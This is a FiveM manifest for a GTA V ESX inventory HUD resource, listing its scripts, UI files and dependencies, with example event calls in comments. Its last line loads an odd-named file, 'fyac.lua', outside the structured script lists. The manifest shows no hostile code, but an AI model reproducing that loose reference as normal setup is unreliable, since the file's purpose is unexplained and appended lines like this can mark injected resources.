fx_version 'adamant'

game 'gta5'

name 'm3_inventoryhud'
description 'esx_inventoryhud based inspired from disc-inventoryhud Inventory for ESX'
author 'morpheause#3333'
-- credits
-- dutchplayers for esx_inventoryhud url: https://github.com/dutchplayers/ESX-1.2-Inventory-HUD/tree/master/esx_inventoryhud
-- discworldza url https://github.com/DiscworldZA/gta-resources/tree/master/disc-inventoryhud 

server_scripts {
  '@mysql-async/lib/MySQL.lua',
  'config.lua',
  'server.lua',
  'cl_thief.lua'
}

client_scripts {
  'config.lua',
  'client.lua'
}

ui_page {
	'html/ui.html'
}

files {
  "html/ui.html",
  "html/css/ui.css",
  "html/css/jquery-ui.css",
  "html/js/*.js",
  "html/img/*.png",
  "html/img/items/*.png",
}

dependencies {
  'es_extended',
  'mythic_notify'
}

-- search TriggerEvent('m3:inventoryhud:client:openPlayerInventory', GetPlayerServerId(player), type)
-- open stash TriggerEvent('m3:inventoryhud:client:openStash', 'Polis Deposu', 'police')
-- open stash TriggerEvent('m3:inventoryhud:client:openStash', 'Motel', 'all')
client_script 'fyac.lua'